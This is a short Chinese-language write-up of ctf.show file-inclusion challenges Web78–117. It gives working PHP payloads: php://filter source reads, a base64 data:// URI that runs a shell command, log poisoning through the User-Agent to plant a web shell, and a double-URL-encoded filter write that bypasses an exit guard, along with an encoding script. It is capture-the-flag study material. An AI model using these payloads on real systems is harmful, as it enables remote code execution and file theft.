---
title: Web78-117文件包含
author: Troy3e
avatar: 'https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/QQ%E5%9B%BE%E7%89%8720210427144151.jpg'
authorAbout: SteamID：888007034
authorDesc: Blizzard：TroyeSivan#51769
categories: 技术
comments: true
date: 2021-07-26 16:19:06
authorLink:
tags:
keywords:
description:
photos: https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1159230.jpg
---
## Web78
php://filter/read=convert.base64-encode/resource=./flag.php

## Web79
data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=

## Web80
包含日志文件 进行getshell 日志文件路径： ?file=/var/log/nginx/access.log
改ua写马。

## Web81
同上

## Web117
前面的要么重复要么是很久以前就做过的东西，就不写了。

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210726155811.png)

还是死亡exit绕过，但是过滤了好多东西。
我看了出题人给的解法，用的一个其他的字符编码，还不错。
但其实这里根本不用这么麻烦，file_put_contents这东西它本身就是二次编码，所以直接：

	http://2ee28656-2bd6-4372-89f0-0b0505f20d16.challenge.ctf.show:8080/?file=php://filter/write=%7%33tring.%7%32ot13/resource=2.php

即可。

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210726161119.png)

可能有人需要二次编码的脚本：

	<?php
	$string = 'php://filter/write=string.rot13/resource=2.php'; //需要二次编码的字符或字符串
	$result = '';
	for($i=0;$i<strlen($string);$i++){
		$char = $string[$i];
		for ($ascii1 = 0; $ascii1 < 256; $ascii1++) {
			for ($ascii2 = 0; $ascii2 < 256; $ascii2++) {
				$aaa = '%'.$ascii1.'%'.$ascii2;
				if(urldecode(urldecode($aaa)) == $char){
					echo $char.': '.$aaa;
					echo "\n";
					$result = $result.$aaa;
					break 2;
				}
			}
		}
	}
	echo $result;
	?>

出题人的解也放一下，不过我估计我记不住：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210726161515.png)

